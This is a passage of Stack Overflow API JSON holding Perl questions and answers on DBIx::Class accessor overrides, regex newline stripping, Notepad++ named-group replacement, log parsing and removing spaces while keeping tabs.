"https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": true, "score": 1, "last_activity_date": 1447253484, "last_edit_date": 1447253484, "creation_date": 1447175551, "answer_id": 33635706, "question_id": 33634610, "link": "https://stackoverflow.com/questions/33634610/dbixclass-and-overloading-accessors/33635706#33635706", "title": "DBIx::Class and overloading accessors", "body": "<p>What you need here is a <a href=\"https://metacpan.org/pod/DBIx::Class::Schema::Loader::Base#col_accessor_map\" rel=\"nofollow\">col_accessor_map</a> passed in as a loader option.</p>\n\n<pre><code>col_accessor_map =&gt; {\n  table_name =&gt; {\n    date =&gt; _date,\n  }\n}\n</code></pre>\n\n<p>You can pass loader options to <a href=\"https://metacpan.org/pod/distribution/DBIx-Class-Schema-Loader/script/dbicdump\" rel=\"nofollow\">dbicdump</a> with <code>-o</code>.</p>\n\n<pre><code>$ dbicdump -o col_accessor_map=\"{ table_name =&gt; { date =&gt; _date } }\" ... other options ...\n</code></pre>\n\n<p>(Replace <code>table_name</code> above with the name of your table - that's obvious, right?)</p>\n\n<p><strong>Update:</strong> This was posted untested, and when I finally got round to testing it, I found it didn't work. After a conversation with <a href=\"https://metacpan.org/author/ILMARI\" rel=\"nofollow\">the author</a> on IRC I was told that the <code>col_accessor_map</code> option doesn't support this nested hash approach, so if you wanted to use this approach you would need to use a coderef.</p>\n\n<p>However, the author also agreed that adding this support would be a good idea and I've just got back from lunch to find this <a href=\"https://github.com/dbsrgits/dbix-class-schema-loader/commit/3a7a1d7726d84d0970d8ff8e8107fc52e3af0f53\" rel=\"nofollow\">Github commit</a> which adds the feature. I don't know how soon it will get to CPAN though.</p>\n\n<p>This may be the first time that CPAN has been updated to make a SO answer correct :-)</p>\n"}, {"tags": [], "owner": {"reputation": 519, "user_id": 463797, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef506c0f33a46f69ea5132411b8b3765?s=128&d=identicon&r=PG", "display_name": "ashley", "link": "https://stackoverflow.com/users/463797/ashley"}, "is_accepted": false, "score": 0, "last_activity_date": 1447267038, "last_edit_date": 1447267038, "creation_date": 1447245568, "answer_id": 33650738, "question_id": 33634610, "link": "https://stackoverflow.com/questions/33634610/dbixclass-and-overloading-accessors/33650738#33650738", "title": "DBIx::Class and overloading accessors", "body": "<p>At a different level of abstraction I believe you could use a method modifier</p>\n\n<pre><code>use Class::Method::Modifier; # or Moose/Moo\naround date =&gt; sub {...};\n</code></pre>\n"}], "owner": {"reputation": 587, "user_id": 2245633, "user_type": "registered", "accept_rate": 18, "profile_image": "https://i.stack.imgur.com/SLpQK.gif?s=128&g=1", "display_name": "CodeGorilla", "link": "https://stackoverflow.com/users/2245633/codegorilla"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 234, "favorite_count": 0, "accepted_answer_id": 33635706, "answer_count": 2, "score": 1, "last_activity_date": 1554731993, "creation_date": 1447172282, "last_edit_date": 1554731993, "question_id": 33634610, "link": "https://stackoverflow.com/questions/33634610/dbixclass-and-overloading-accessors", "title": "DBIx::Class and overloading accessors", "body": "<p>(Similar to, but with more concrete details that, <a href=\"https://stackoverflow.com/questions/11526999/dbixclass-wrapping-overloading-a-column-accessor\">#11526999</a>)</p>\n\n<p>My Result Classes have been built using <code>dbicdump</code>, however I wish to overload the default accessor for a <code>date</code> field.</p>\n\n<h2>Works, but a bodge</h2>\n\n<p>To <em>hackytest</em> my idea, I simply added an <code>accessor</code> attribute to the created <code>date</code> key of the <code>add_columns</code> call:</p>\n\n<pre><code>__PACKAGE__-&gt;add_columns(\n  \"stamp_id\",\n  {\n    data_type         =&gt; \"integer\",\n    is_auto_increment =&gt; 1,\n    is_nullable       =&gt; 0,\n    sequence          =&gt; \"timestamp_stamp_id_seq\",\n  },\n  \"date\",\n  { data_type =&gt; \"date\", is_nullable =&gt; 0, accessor =&gt; '_date' },\n);\n</code></pre>\n\n<p>... and created my accessor routine below the Schema::Loader checksum line:</p>\n\n<pre><code># DO NOT MODIFY THIS OR ANYTHING ABOVE! md5sum:nB5koMYAhBwz4ET77Q8qlA\n\nsub date {\n  my $self = shift;\n  warn \"overloaded date\\n\"; # Added for debugging\n  my $date;\n\n  # The date needs to be just the date, not the time\n  if ( @_ ) {\n    $date = shift;\n    if ( $date =~ /^([\\d\\-]+)/ ) {\n      $date = $1\n    }\n    return $self-&gt;_date($date)\n  }\n\n  # Fetch the column value &amp; remove the time part.\n  $date = $self-&gt;_date;\n  if ( $date =~ /^([\\d\\-]+)/ ) {\n      $date = $1\n  }\n\n  return $date;\n}\n</code></pre>\n\n<p>This works, as it returns an expected <code>2014-10-04</code>, but is a bodge.</p>\n\n<h2>Do it the right way</h2>\n\n<p>The problem is that I've hacked the checksum'd code, so I can't neatly re-generate my Class objects.</p>\n\n<p>Reading <a href=\"https://metacpan.org/pod/DBIx::Class::ResultSource#accessor\" rel=\"nofollow noreferrer\">ResultSource</a> and the <a href=\"https://metacpan.org/pod/DBIx::Class::Manual::Cookbook#Wrapping-overloading-a-column-accessor\" rel=\"nofollow noreferrer\">CookBook</a> the correct approach appears to be:</p>\n\n<p>Have the ResultSource built by <code>dbicdump</code> as standard:</p>\n\n<pre><code>__PACKAGE__-&gt;add_columns(\n  \"stamp_id\",\n  {\n    data_type         =&gt; \"integer\",\n    is_auto_increment =&gt; 1,\n    is_nullable       =&gt; 0,\n    sequence          =&gt; \"timestamp_stamp_id_seq\",\n  },\n  \"date\",\n  { data_type =&gt; \"date\", is_nullable =&gt; 0 },\n);\n</code></pre>\n\n<p>.... add a <em>change the accessor</em> <strong>below the line</strong>, using the <code>+</code> to indicate it's an alteration to an existing definition:</p>\n\n<pre><code># DO NOT MODIFY THIS OR ANYTHING ABOVE! md5sum:nB5koMYAhBwz4ET77Q8qlA\n\n__PACKAGE__-&gt;add_columns(\n  \"+date\", { accessor =&gt; '_date' },\n);\n</code></pre>\n\n<p>.... use the overload method as before</p>\n\n<h2>Not working.</h2>\n\n<p>I've double-checked my spelling, I've tried <code>add_column</code> rather than <code>add_columns</code>, and I've tried putting the second <code>add_columns</code> to directly below the first - all to now avail.... the code uses the default accessor, and returns <code>2014-10-04T00:00:00</code></p>\n\n<p>How do I over-ride the default accessor, so I can use my own method?</p>\n\n<p>Thankee...</p>\n"}, {"tags": ["regex", "string", "perl", "replace"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user557597"}, "edited": false, "score": 0, "creation_date": 1447170629, "post_id": 33633807, "comment_id": 55041597, "body": "Isn&#39;t <code>\\R</code> just any linebreak? Also, between quotes there could be non-consecutive newlines, etc.. Another problem is the quotes, are they balanced within the full input? You don&#39;t seem to be anchoring the start with any literal&#39;s."}, {"owner": {"reputation": 1, "user_id": 5546291, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1f27cae5072a593c18c4dbcf021bafd?s=128&d=identicon&r=PG&f=1", "display_name": "Alastair K", "link": "https://stackoverflow.com/users/5546291/alastair-k"}, "edited": false, "score": 0, "creation_date": 1447170745, "post_id": 33633807, "comment_id": 55041686, "body": "Yes, \\R is any line break I believe.  I&#39;ve seen a few here searching. I think there could be non-consecutive newlines and other characters I want to replace with nothing, or just a space character. How would I anchor the start?  You mean something like&quot;,&quot; or &quot;, &quot; that I expect to see before the quoted string, and maybe &quot;,&quot; or &quot;)&quot; after the quoted string?  Thanks."}, {"owner": {"reputation": 1050, "user_id": 1636683, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c5f282a2b7d41f9a3e3f9eced4c3fcf7?s=128&d=identicon&r=PG", "display_name": "Ron Bergin", "link": "https://stackoverflow.com/users/1636683/ron-bergin"}, "edited": false, "score": 2, "creation_date": 1447171598, "post_id": 33633807, "comment_id": 55042311, "body": "You slurped the file into an array and then loop over the data line-by-line but your regex indicates that you want match a multi line string.  That&#39;s not going to work.  You&#39;ll probably want/need to slurp the file into a scalar."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447175238, "post_id": 33633807, "comment_id": 55045005, "body": "Try <code>use Data::Dumper;</code> and <code>print \\@lines</code>. I think this will highlight one of your problems. It&#39;s defaulting to splitting on linefeeds, so each element of <code>@lines</code> is by definition a single line."}], "answers": [{"comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user557597"}, "edited": false, "score": 0, "creation_date": 1447171347, "post_id": 33634272, "comment_id": 55042126, "body": "Not totally sure on the eval form though <code>s&#47;&#47;&#47;eg</code>"}], "tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user557597"}, "is_accepted": false, "score": 0, "last_activity_date": 1447171660, "last_edit_date": 1447171660, "creation_date": 1447171308, "answer_id": 33634272, "question_id": 33633807, "link": "https://stackoverflow.com/questions/33633807/perl-regex-remove-newlines-in-string/33634272#33634272", "title": "perl regex remove newlines in string", "body": "<p>The real problem is that you will only find one group of <code>\\R</code>'s when there could be many groups between quotes. The best thing to do is make a callback (eval) with a general match between quotes, then substitute the <code>\\R</code>'s in<br>\nthe replacement.  </p>\n\n<p>something like:  </p>\n\n<pre><code>sub repl {\n  my ($content) = _@;\n  $content =~ s/\\R+//g;\n  return $content;\n}\n\n$input =~ s/\"([^\"]*)\"/ repl($1) /ge;\n</code></pre>\n\n<p><strong>edit</strong>:  If you're looking for only 1 linebreak cluster, you have to<br>\nexclude linebreaks leading up to it.  For example: <code>[^\"\\r\\n]+</code>  </p>\n\n<p><em>edit2:</em> To slurp the file into <code>$input</code>, do a  </p>\n\n<pre><code>$/ = undef;\nmy $input = &lt;$fh&gt;; \n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 5546291, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1f27cae5072a593c18c4dbcf021bafd?s=128&d=identicon&r=PG&f=1", "display_name": "Alastair K", "link": "https://stackoverflow.com/users/5546291/alastair-k"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1288, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1447171660, "creation_date": 1447169991, "last_edit_date": 1447170665, "question_id": 33633807, "link": "https://stackoverflow.com/questions/33633807/perl-regex-remove-newlines-in-string", "title": "perl regex remove newlines in string", "body": "<p>I have a Perl script which runs over a database dump in a plain text file, trying to remove all instances of newlines and possibly other odd characters when I see strings between quotes:</p>\n\n<pre><code>INSERT INTO ... VALUES ( \"... these are the lines I'm interested in.\" )\n</code></pre>\n\n<p>I slurp in the file:</p>\n\n<pre><code>@file = &lt;FILE&gt;;\n</code></pre>\n\n<p>and:</p>\n\n<pre><code>foreach my $line (@file) {\n    $line =~ s/\"[^\"]*(\\R)+[^\"]*\"//g;\n    # I want to get rid of newlines in strings\n    # And other odd characters I might come across\n}\n</code></pre>\n\n<p>One character class I used instead of (\\R) was:</p>\n\n<pre><code>([\\r\\n\\t\\v\\f]+)\n</code></pre>\n\n<p>and I would try to:</p>\n\n<pre><code>$line =~ s/\"[^\"]+?([\\r\\n\\t\\v\\f]+)[^\"]*\"//g;\n</code></pre>\n\n<p>I'm sure I'm missing something.  I try to start matching with a literal double quote, scan past anything not a double quote (non-greedy, at least one match), reach the characters I want to get rid of, and keep scanning not double quote (any number of other characters not a double quote) until I reach the ending double quote.</p>\n\n<p>So I wanted to replace $1 capture above with nothing.</p>\n\n<p>I've tried on-line regex builders, and</p>\n\n<pre><code>/\"[^\"]*?([\\r\\n\\t\\f\\v]+)[^\"]*\"/\n</code></pre>\n\n<p>worked with an on-line test, using a short paragraph with newlines and tabs in it, although it was in PHP pcre mode.  I thought it would have worked with Perl.</p>\n\n<p>Perhaps I'm not escaping some characters properly in the regex for Perl?  Or the pattern is just not going to work the way I want it to, because it's wrong.</p>\n\n<p>Thank you, any help appreciated.</p>\n\n<p>The regex at regex101.com:</p>\n\n<pre><code>\"[^\"]*?([\\r\\n\\f\\t\\v]+)[^\"]*?\"\n</code></pre>\n\n<p>matches for strings like this:</p>\n\n<p>\"This is</p>\n\n<p>my\\t    test</p>\n\n<p>string.</p>\n\n<p>So there!\"</p>\n\n<p>I'm thoroughly puzzled now. :)</p>\n"}, {"tags": ["regex", "perl", "notepad++", "regex-group", "named"], "comments": [{"owner": {"reputation": 11918, "user_id": 5527985, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CfG3C.png?s=128&g=1", "display_name": "bobble bubble", "link": "https://stackoverflow.com/users/5527985/bobble-bubble"}, "edited": false, "score": 1, "creation_date": 1447170556, "post_id": 33633091, "comment_id": 55041548, "body": "Try just numeric group index <code>\\1</code> or <code>$1</code>. Groupname would be <a href=\"https://regex101.com/r/mR0nU9/1\" rel=\"nofollow noreferrer\">\\g&lt;n1&gt;</a>, <code>${n1}</code> in replace or maybe <code>\\k{n1}</code>,<code>\\g{n1}</code> but none seems to work in np++."}, {"owner": {"user_type": "does_not_exist", "display_name": "user557597"}, "edited": false, "score": 0, "creation_date": 1447173274, "post_id": 33633091, "comment_id": 55043567, "body": "In Perl you might try <code>$+{name}</code> on the replacement side, but it should be in the form of eval <code>s&#47;&#47;&#47;eg</code> (not sure about the eval)"}, {"owner": {"reputation": 101, "user_id": 4862290, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aac49c8c41c29baf94d908dfe814ceb8?s=128&d=identicon&r=PG&f=1", "display_name": "Victor Dronov", "link": "https://stackoverflow.com/users/4862290/victor-dronov"}, "edited": false, "score": 0, "creation_date": 1447237670, "post_id": 33633091, "comment_id": 55070561, "body": "\\1 \\2 ... working fine in simple samles, but in this case it dosent work (you can try)"}, {"owner": {"reputation": 101, "user_id": 4862290, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aac49c8c41c29baf94d908dfe814ceb8?s=128&d=identicon&r=PG&f=1", "display_name": "Victor Dronov", "link": "https://stackoverflow.com/users/4862290/victor-dronov"}, "edited": false, "score": 0, "creation_date": 1447237747, "post_id": 33633091, "comment_id": 55070608, "body": "In official help np++ I found what I need but it doesnt work Details here <a href=\"http://docs.notepad-plus-plus.org/index.php/Regular_Expressions\" rel=\"nofollow noreferrer\">docs.notepad-plus-plus.org/index.php/Regular_Expressions</a>"}, {"owner": {"reputation": 400, "user_id": 1366988, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/c233e461648582b4d3bd233e6f2d872a?s=128&d=identicon&r=PG", "display_name": "Decula", "link": "https://stackoverflow.com/users/1366988/decula"}, "edited": false, "score": 0, "creation_date": 1540321592, "post_id": 33633091, "comment_id": 92819968, "body": "I cannot get this regex working at <a href=\"https://regex101.com/\" rel=\"nofollow noreferrer\">regex101.com</a>"}, {"owner": {"reputation": 400, "user_id": 1366988, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/c233e461648582b4d3bd233e6f2d872a?s=128&d=identicon&r=PG", "display_name": "Decula", "link": "https://stackoverflow.com/users/1366988/decula"}, "edited": false, "score": 0, "creation_date": 1540322034, "post_id": 33633091, "comment_id": 92820167, "body": "regex101.com is a really powerful regex platform. The explanation for the regex is pooooooooowerful!"}, {"owner": {"reputation": 400, "user_id": 1366988, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/c233e461648582b4d3bd233e6f2d872a?s=128&d=identicon&r=PG", "display_name": "Decula", "link": "https://stackoverflow.com/users/1366988/decula"}, "edited": false, "score": 0, "creation_date": 1540326807, "post_id": 33633091, "comment_id": 92822337, "body": "how should I use regex to replace this reference?   [23] D. Spina, M.-H. Peetz, and M. de Rijke. Active learning for entity filtering in microblog streams. In Proceedings of the 38th International ACM SIGIR Conference on Research and Development in Information Retrieval, SIGIR \u201915, pages 975 978. ACM, 2015."}, {"owner": {"reputation": 101, "user_id": 4862290, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aac49c8c41c29baf94d908dfe814ceb8?s=128&d=identicon&r=PG&f=1", "display_name": "Victor Dronov", "link": "https://stackoverflow.com/users/4862290/victor-dronov"}, "reply_to_user": {"reputation": 400, "user_id": 1366988, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/c233e461648582b4d3bd233e6f2d872a?s=128&d=identicon&r=PG", "display_name": "Decula", "link": "https://stackoverflow.com/users/1366988/decula"}, "edited": false, "score": 0, "creation_date": 1541592753, "post_id": 33633091, "comment_id": 93267365, "body": "@Decula Which result you are expect to get?"}, {"owner": {"reputation": 101, "user_id": 4862290, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aac49c8c41c29baf94d908dfe814ceb8?s=128&d=identicon&r=PG&f=1", "display_name": "Victor Dronov", "link": "https://stackoverflow.com/users/4862290/victor-dronov"}, "edited": false, "score": 0, "creation_date": 1541606031, "post_id": 33633091, "comment_id": 93274994, "body": "<b>Regex:</b> <code>^\\[?(?&lt;n1&gt;\\d{1,3}\\.?)\\]? (?&lt;n2&gt;((and )?(-?[A-Z]\\. ?)+(de )?[A-Z][a-Z]+[,.] )+)(?&lt;n3&gt;.+)</code>                 <b>Replace with:</b> <code>$+{n1} $+{n3} &#47;&#47; $+{n2}</code> <b>Output:</b> <code>23 Active learning for entity filtering in microblog streams. In Proceedings of the 38th International ACM SIGIR Conference on Research and Development in Information Retrieval, SIGIR \u201915, pages 975 978. ACM &#47;&#47; D. Spina, M.-H. Peetz, and M. de Rijke. </code>"}], "answers": [{"comments": [{"owner": {"reputation": 400, "user_id": 1366988, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/c233e461648582b4d3bd233e6f2d872a?s=128&d=identicon&r=PG", "display_name": "Decula", "link": "https://stackoverflow.com/users/1366988/decula"}, "edited": false, "score": 0, "creation_date": 1540320525, "post_id": 41532181, "comment_id": 92819427, "body": "ensure you selected &quot;Match case&quot; and &quot;Regular expression&quot; in the Replace tab."}, {"owner": {"reputation": 101, "user_id": 4862290, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aac49c8c41c29baf94d908dfe814ceb8?s=128&d=identicon&r=PG&f=1", "display_name": "Victor Dronov", "link": "https://stackoverflow.com/users/4862290/victor-dronov"}, "reply_to_user": {"reputation": 400, "user_id": 1366988, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/c233e461648582b4d3bd233e6f2d872a?s=128&d=identicon&r=PG", "display_name": "Decula", "link": "https://stackoverflow.com/users/1366988/decula"}, "edited": false, "score": 1, "creation_date": 1541592340, "post_id": 41532181, "comment_id": 93267174, "body": "@Decula I do not need Match case. Question was only about named groups which in official notepad++ documentation described incorrect."}], "tags": [], "owner": {"reputation": 418, "user_id": 7390443, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000446081881/picture?type=large", "display_name": "Jakub Binkowski", "link": "https://stackoverflow.com/users/7390443/jakub-binkowski"}, "is_accepted": true, "score": 16, "last_activity_date": 1483874734, "creation_date": 1483874734, "answer_id": 41532181, "question_id": 33633091, "link": "https://stackoverflow.com/questions/33633091/notepad-regex-replace-named-groups/41532181#41532181", "title": "Notepad++ regex replace named groups", "body": "<p>Try using in regex <code>(?&lt;groupname&gt;something to match)</code></p>\n\n<p>And in replacement: <code>$+{groupname}</code></p>\n"}], "owner": {"reputation": 101, "user_id": 4862290, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aac49c8c41c29baf94d908dfe814ceb8?s=128&d=identicon&r=PG&f=1", "display_name": "Victor Dronov", "link": "https://stackoverflow.com/users/4862290/victor-dronov"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5876, "favorite_count": 3, "accepted_answer_id": 41532181, "answer_count": 1, "score": 9, "last_activity_date": 1511446429, "creation_date": 1447167944, "last_edit_date": 1511446429, "question_id": 33633091, "link": "https://stackoverflow.com/questions/33633091/notepad-regex-replace-named-groups", "title": "Notepad++ regex replace named groups", "body": "<p>I try replace author Full name with article title \nI have a list of articles, similar like this:</p>\n\n<blockquote>\n  <ol start=\"100\">\n  <li>Albershein\u00a0P., Nevis\u00a0D.\u00a0J. A method for analysis of sugars in plant cell wall polysaccharides by gasliquid chromatography // J. Carbohydrate Research. \u2013 1967. \u2013 Vol. 5, \u2116 3. \u2013 \u0420. 340\u2013345.</li>\n  </ol>\n</blockquote>\n\n<p>And I have Regex for it</p>\n\n<pre><code>(?'n1'^\\d{3}\\. )(?'n2'(?:(?:[A-Z\u0410-\u042f][-a-z\u0107\u0430-\u044f ]+)?([A-Z\u0410-\u042f][-a-z\u0107\u0430-\u044f]+\\xA0[A-Z\u0410-\u042f]\\.(?:\\xA0[A-Z\u0410-\u042f]\\.){0,2}\\,?)(?: \\[et al\\])? ?)+)(?'n3' [^\\/]+[\\/]{2})\n</code></pre>\n\n<p>but replace like </p>\n\n<pre><code>\\k{n1} \n</code></pre>\n\n<p>or </p>\n\n<pre><code>\\k'n1'\n</code></pre>\n\n<p>doesnt work</p>\n\n<p>we try this in perl but have the same result</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447168103, "post_id": 33633032, "comment_id": 55039718, "body": "What&#39;s the pattern you&#39;re looking for? It&#39;s hard to tell with just one line of sample input."}, {"owner": {"reputation": 11, "user_id": 5547071, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d03f15051b599e99fe5ce6f333183317?s=128&d=identicon&r=PG&f=1", "display_name": "MEsquan", "link": "https://stackoverflow.com/users/5547071/mesquan"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447172878, "post_id": 33633032, "comment_id": 55043295, "body": "User \u201cadmin\u201d attempted to authenticate using authenticator Token_Auth\u201d.  The user belongs to security domain \u201cSystemDomain.Default\u201d"}, {"owner": {"user_type": "does_not_exist", "display_name": "user557597"}, "edited": false, "score": 0, "creation_date": 1447173998, "post_id": 33633032, "comment_id": 55044107, "body": "From your example: <code>Principal authentication&#47;s+(.+?)\\s+Success AUTHN_METHOD_SUCCESS</code>"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 2, "creation_date": 1447177425, "post_id": 33633032, "comment_id": 55046363, "body": "To answer we really need more example data. And ideally an attempt to solve it yourself, with an indication of where you&#39;re having problems."}], "answers": [{"comments": [{"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1447205448, "post_id": 33638033, "comment_id": 55059697, "body": "Wouldn&#39;t you want to splice the first 5 elements? Also, you&#39;re assuming that everything is on a single line, but I&#39;m not sure that&#39;s true. (Hard to say due to lack of information provided by the OP.)"}], "tags": [], "owner": {"reputation": 717, "user_id": 1483288, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/5b0b7a55223dba7a538aaf97dbbc6150?s=128&d=identicon&r=PG", "display_name": "ccc31807", "link": "https://stackoverflow.com/users/1483288/ccc31807"}, "is_accepted": false, "score": 0, "last_activity_date": 1447183809, "creation_date": 1447183809, "answer_id": 33638033, "question_id": 33633032, "link": "https://stackoverflow.com/questions/33633032/perl-regex-needed-for-system-log/33638033#33638033", "title": "Perl RegEx Needed for System Log", "body": "<p>Based on your ONE EXAMPLE (guaranteed to fail for all other examples), I would do the following:</p>\n\n<ol>\n<li>tokenize your log entry</li>\n<li>delete the first three tokens</li>\n<li>delete everything after the last token you want</li>\n</ol>\n\n<p>Illustrative script:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nwhile(&lt;DATA&gt;)\n{\n    my @line = split;\n    splice(@line, 0,3);\n    my $line = join(' ', @line);\n    $line =~ s/Success.*//;\n    print $line;\n}\nexit(0);\n\n__DATA__\n5/1/2013 9:43:00 INFO Principal authentication User \"admin\" attempted to authenticate using authenticator Token_Auth\". The user belongs to security domain \"SystemDomain.Default\" Success AUTHN_METHOD_SUCCESS Authentication method success company.admin company Admin wsnc1_2.def.comp.net SystemDomain.default\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 5547071, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d03f15051b599e99fe5ce6f333183317?s=128&d=identicon&r=PG&f=1", "display_name": "MEsquan", "link": "https://stackoverflow.com/users/5547071/mesquan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 53, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1447183809, "creation_date": 1447167802, "last_edit_date": 1447176178, "question_id": 33633032, "link": "https://stackoverflow.com/questions/33633032/perl-regex-needed-for-system-log", "title": "Perl RegEx Needed for System Log", "body": "<p>I am trying to group everything in bold into a parser. How do I take multiple sentences and ensure they are grouped together?</p>\n\n<blockquote>\n  <p>5/1/2013 9:43:00  INFO    Principal authentication</p>\n  \n  <p><strong>User \u201cadmin\u201d attempted to authenticate using authenticator\n  Token_Auth\u201d. \n      The user belongs to security domain \u201cSystemDomain.Default\u201d</strong><br>\n  Success AUTHN_METHOD_SUCCESS    Authentication method success\n    company.admin   company Admin   wsnc1_2.def.comp.net<br>\n  SystemDomain.default</p>\n</blockquote>\n"}, {"tags": ["perl", "awk", "sed"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447164207, "post_id": 33631770, "comment_id": 55036790, "body": "Just literal spaces? Or do you mean other non-space-whitespace?"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447164740, "post_id": 33631770, "comment_id": 55037177, "body": "Also - why are you doing <code>lape</code> as your flags? <code>pe</code> would seem to be sufficient here?"}], "answers": [{"tags": [], "owner": {"reputation": 52334, "user_id": 702638, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/892f65bc0a8a0949ab88598de7d83cab?s=128&d=identicon&r=PG", "display_name": "Hunter McMillen", "link": "https://stackoverflow.com/users/702638/hunter-mcmillen"}, "is_accepted": false, "score": 2, "last_activity_date": 1447164197, "creation_date": 1447164197, "answer_id": 33631808, "question_id": 33631770, "link": "https://stackoverflow.com/questions/33631770/remove-spaces-but-keep-tabs/33631808#33631808", "title": "remove spaces, but keep tabs", "body": "<p>You can create you own character class that is the <em>negation</em> of all things that are <em>not</em> spaces and a tab, this character class represents all characters that are whitespace - tabs:</p>\n\n<pre><code>perl -lape 's/[^\\S\\t]+//sg'\n</code></pre>\n\n<p><code>[ ... ]</code> defines a character class</p>\n\n<p><code>^</code> inside of <code>[ ... ]</code> negates this character class</p>\n\n<p><code>\\S</code> represents everything not in <code>\\s</code></p>\n\n<p><code>\\t</code> represents a tab character</p>\n"}, {"comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 1, "creation_date": 1447164373, "post_id": 33631829, "comment_id": 55036908, "body": "I think I&#39;d go with <code>+</code> over <code>*</code> here. Intuitively it seems matching zero spaces and replacing it with zero spaces is redundant."}, {"owner": {"reputation": 226874, "user_id": 1983854, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/eKpAk.png?s=128&g=1", "display_name": "fedorqui &#39;SO stop harming&#39;", "link": "https://stackoverflow.com/users/1983854/fedorqui-so-stop-harming"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1447164437, "post_id": 33631829, "comment_id": 55036955, "body": "@Sobrique good point. I tried with <code>s&#47; +&#47;&#47;g&#39;</code> and didn&#39;t work, now I see I was missing to escape the <code>+</code>. Anyway, it is best to just say <code>s&#47; &#47;&#47;g</code> as you suggest."}, {"owner": {"reputation": 10306, "user_id": 658497, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/AiHJI.jpg?s=128&g=1", "display_name": "Noam Manos", "link": "https://stackoverflow.com/users/658497/noam-manos"}, "edited": false, "score": 0, "creation_date": 1591526337, "post_id": 33631829, "comment_id": 110083798, "body": "I think escaping + is required if not using <code>g</code>lobal. For example, here&#39;s how I trim spaces (excluding tabs) from each start and end of lines: <code>sed &#39;s&#47;^ 